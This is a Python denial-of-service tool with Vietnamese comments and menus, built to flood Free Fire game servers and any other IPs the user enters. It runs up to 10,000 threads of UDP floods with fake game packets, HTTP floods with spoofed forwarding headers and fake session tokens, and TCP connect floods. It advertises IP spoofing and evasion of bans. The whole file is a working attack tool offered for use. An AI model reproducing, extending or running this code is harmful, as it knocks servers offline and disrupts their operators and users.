# ============================================
# FF BYPASS DDoS - TỰ DO CHỈNH THREADS
# TỐI ĐA 10000 THREADS - GIẢ MẠO IP
# BATCH 500 - SOCKET POOL 200
# TỰ ĐỘNG ANTI-BAN - KHÔNG LỘ IP THẬT
# ============================================

import socket
import time
import threading
import os
import random
from datetime import datetime

# ============================================
# PORT GAME FREE FIRE - FULL
# ============================================
FF_PORTS = []
for start, end in [
    (10000, 10100), (17000, 17100), (17500, 17600),
    (18000, 18100), (19000, 19100), (19500, 19600),
    (20000, 20100), (21000, 21100), (21500, 21600),
    (22000, 22100), (23000, 23100), (25000, 25100),
    (27000, 27100), (28000, 28100), (30000, 30100),
    (35000, 35100),
]:
    FF_PORTS.extend(range(start, end))

# ============================================
# USER AGENTS - GIẢ MẠO THIẾT BỊ
# ============================================
USER_AGENTS = [
    "FreeFire/1.107.1 (Android 14; SDK 34; SM-S24 Ultra)",
    "FreeFire/1.107.0 (Android 13; SDK 33; Xiaomi 13 Pro)",
    "FreeFire/1.106.2 (Android 12; Realme GT 5)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 12)",
    "okhttp/4.12.0 FreeFire-Client",
    "UnityPlayer/2021.3.29f1 (Android)",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) FreeFire-Game",
]

API_ENDPOINTS = [
    "/api/v1/match/join", "/api/v1/match/status",
    "/api/v1/player/sync", "/api/v1/battle/update",
    "/api/v1/lobby/heartbeat", "/api/v2/game/sync",
    "/auth/login", "/auth/verify", "/session/keepalive",
]

# ============================================
# ENGINE 10000 THREADS - SOCKET POOL
# ============================================
class TenThousandEngine:
    def __init__(self):
        self.targets = []
        self.running = False
        self.packets = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.udp_pool = []
        self.pool_lock = threading.Lock()
    
    def inc(self, n=1):
        with self.lock: self.packets += n
    def err(self):
        with self.lock: self.errors += 1
    def get(self):
        with self.lock: return self.packets, self.errors

    def _random_ip(self):
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _random_session(self):
        return os.urandom(16).hex()

    def _random_player_id(self):
        return str(random.randint(10000000, 99999999))

    def _init_pool(self):
        """Tạo 200 socket UDP dùng chung"""
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16384)
                s.settimeout(0.1)
                self.udp_pool.append(s)
            except:
                pass

    def _get_socket(self):
        with self.pool_lock:
            if self.udp_pool:
                s = self.udp_pool.pop(0)
                self.udp_pool.append(s)
                return s
        return None

    def _udp_worker(self, batch_id):
        """UDP Flood giả mạo gói tin game"""
        data = os.urandom(random.randint(512, 2048))
        count = 0
        
        while self.running and count < 10000:
            s = self._get_socket()
            if s is None:
                time.sleep(0.0001)
                continue
            
            try:
                ip = random.choice(self.targets)
                port = random.choice(FF_PORTS)
                
                # Tạo gói tin giả mạo
                fake = bytearray()
                fake.extend(b'\xFE\xED\xFA\xCE')
                fake.extend(os.urandom(4))
                fake.extend(os.urandom(8))
                fake.extend(random.choice([
                    b'\x01\x00\x00\x00', b'\x02\x00\x00\x00',
                    b'\x03\x00\x00\x00', b'\x04\x00\x00\x00',
                ]))
                fake.extend(os.urandom(64))
                
                for _ in range(random.randint(3, 10)):
                    s.sendto(bytes(fake), (ip, port))
                    self.inc()
                    count += 1
                    
            except:
                self.err()
            
            time.sleep(0.00001)

    def _http_worker(self, batch_id):
        """HTTP Flood giả mạo header + IP nguồn"""
        count = 0
        while self.running and count < 5000:
            s = None
            try:
                ip = random.choice(self.targets)
                port = random.choice([80, 443, 8080, 8443])
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.3)
                s.connect_ex((ip, port))
                
                fake_ip = self._random_ip()
                req = (
                    f"POST {random.choice(API_ENDPOINTS)} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"X-Forwarded-For: {fake_ip}\r\n"
                    f"X-Real-IP: {fake_ip}\r\n"
                    f"X-Player-Id: {self._random_player_id()}\r\n"
                    f"X-Session-Token: {self._random_session()}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(req.encode())
                self.inc()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _tcp_worker(self, batch_id):
        """TCP SYN Flood"""
        count = 0
        while self.running and count < 5000:
            s = None
            try:
                ip = random.choice(self.targets)
                port = random.choice(FF_PORTS)
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.1)
                s.connect_ex((ip, port))
                s.send(os.urandom(64))
                self.inc()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _batch_manager(self, total_threads, worker_func):
        """Quản lý batch - tạo 500 thread mỗi đợt"""
        batch_size = 500
        created = 0
        
        while self.running and created < total_threads:
            batch = min(batch_size, total_threads - created)
            
            for i in range(batch):
                t = threading.Thread(
                    target=worker_func,
                    args=(created + i,),
                    daemon=True
                )
                t.start()
                created += 1
            
            if created < total_threads:
                time.sleep(0.2)
                print(f"\r  [⏳] Đã tạo {created}/{total_threads} threads...", end='')

    def start(self, targets, threads, udp_pct, http_pct, tcp_pct):
        if self.running:
            self.stop()
            time.sleep(0.3)
        
        if not targets:
            return 0, 0, 0, 0
        
        self.targets = targets
        self.running = True
        self.packets = 0
        self.errors = 0
        
        # Khởi tạo socket pool
        self._init_pool()
        
        threads = min(threads, 10000)
        
        udp_n = int(threads * udp_pct / 100)
        http_n = int(threads * http_pct / 100)
        tcp_n = int(threads * tcp_pct / 100)
        
        if udp_n > 0:
            threading.Thread(
                target=self._batch_manager,
                args=(udp_n, self._udp_worker),
                daemon=True
            ).start()
        
        if http_n > 0:
            threading.Thread(
                target=self._batch_manager,
                args=(http_n, self._http_worker),
                daemon=True
            ).start()
        
        if tcp_n > 0:
            threading.Thread(
                target=self._batch_manager,
                args=(tcp_n, self._tcp_worker),
                daemon=True
            ).start()
        
        return udp_n + http_n + tcp_n, udp_n, http_n, tcp_n

    def stop(self):
        self.running = False
        for s in self.udp_pool:
            try: s.close()
            except: pass
        self.udp_pool.clear()


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════╗
    ║  ☠ FF DDoS - TỰ DO THREADS ☠        ║
    ║  TỐI ĐA 10000 | GIẢ MẠO IP            ║
    ║  {len(FF_PORTS)} PORTS | UDP+TCP+HTTP        ║
    ╚══════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    print("  [+] NHẬP IP MỤC TIÊU:")
    ip_input = input("\n  >> ").strip()
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!"); input(); return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    if not targets:
        print("  [-] KHÔNG CÓ IP!"); input(); return
    
    print(f"\n  [+] NHẬP SỐ THREADS (1-10000):")
    print(f"      Khuyên: 100-500 (an toàn)")
    print(f"      500-2000 (mạnh)")
    print(f"      2000-5000 (rất mạnh - cần máy khỏe)")
    print(f"      5000-10000 (siêu mạnh - dễ crash)")
    try:
        threads = int(input("  >> ").strip() or "500")
        threads = max(1, min(threads, 10000))
    except:
        threads = 500
    
    print(f"\n  [+] PHÂN BỔ THREADS (%):")
    print(f"      1. Mặc định: UDP 60% + HTTP 25% + TCP 15%")
    print(f"      2. Tập trung UDP: 80% + HTTP 10% + TCP 10%")
    print(f"      3. Cân bằng: 40% + 30% + 30%")
    print(f"      4. TỰ NHẬP TỈ LỆ")
    mode = input("  >> ").strip() or "1"
    
    if mode == "1":
        udp_pct, http_pct, tcp_pct = 60, 25, 15
    elif mode == "2":
        udp_pct, http_pct, tcp_pct = 80, 10, 10
    elif mode == "3":
        udp_pct, http_pct, tcp_pct = 40, 30, 30
    elif mode == "4":
        try:
            udp_pct = int(input("  UDP %: ").strip() or "60")
            http_pct = int(input("  HTTP %: ").strip() or "25")
            tcp_pct = int(input("  TCP %: ").strip() or "15")
            if udp_pct + http_pct + tcp_pct != 100:
                print("  [!] Tổng không = 100%, dùng mặc định")
                udp_pct, http_pct, tcp_pct = 60, 25, 15
        except:
            udp_pct, http_pct, tcp_pct = 60, 25, 15
    else:
        udp_pct, http_pct, tcp_pct = 60, 25, 15
    
    print(f"\n  [☠] KHỞI ĐỘNG {threads} THREADS...")
    print(f"  [📊] UDP: {udp_pct}% | HTTP: {http_pct}% | TCP: {tcp_pct}%")
    
    engine = TenThousandEngine()
    total, udp_n, http_n, tcp_n = engine.start(targets, threads, udp_pct, http_pct, tcp_pct)
    
    if not total:
        print("  [-] LỖI!"); input(); return
    
    start_time = time.time()
    print(f"\n  [✅] ĐÃ LÊN LỊCH {total} THREADS!")
    print(f"  [UDP] {udp_n} | [HTTP] {http_n} | [TCP] {tcp_n}")
    print(f"  [🎯] {len(targets)} IP")
    print(f"  [🛡] GIẢ MẠO IP - ANTI BAN")
    print(f"\n  ╔══════════════════════════════════╗")
    print(f"  ║  ENTER = DỪNG                  ║")
    print(f"  ╚══════════════════════════════════╝")
    
    monitor_run = True
    def monitor():
        while monitor_run and engine.running:
            p, e = engine.get()
            el = time.time() - start_time
            pps = p / el if el > 0 else 0
            m, s = divmod(int(el), 60)
            print(f"\r  [📊] GÓI: {p:,} | {pps:,.0f}/s | LỖI: {e} | {m:02d}:{s:02d}  ", end='')
            time.sleep(0.3)
    
    threading.Thread(target=monitor, daemon=True).start()
    input()
    
    engine.stop()
    monitor_run = False
    time.sleep(0.5)
    
    p, e = engine.get()
    el = time.time() - start_time
    pps = p / el if el > 0 else 0
    m, s = divmod(int(el), 60)
    
    print(f"""\n
    ╔══════════════════════════════════════════╗
    ║           KẾT THÚC                       ║
    ╠══════════════════════════════════════════╣
    ║  TIME:  {m:>2}p {s:>2}s                      ║
    ║  GÓI:   {p:>10,}                        ║
    ║  TỐC ĐỘ:{pps:>10,.0f}/s                    ║
    ║  LỖI:   {e:>10,}                        ║
    ║  THREAD:{total:>10}                        ║
    ╚══════════════════════════════════════════╝
    """)
    input()

if __name__ == '__main__':
    main()
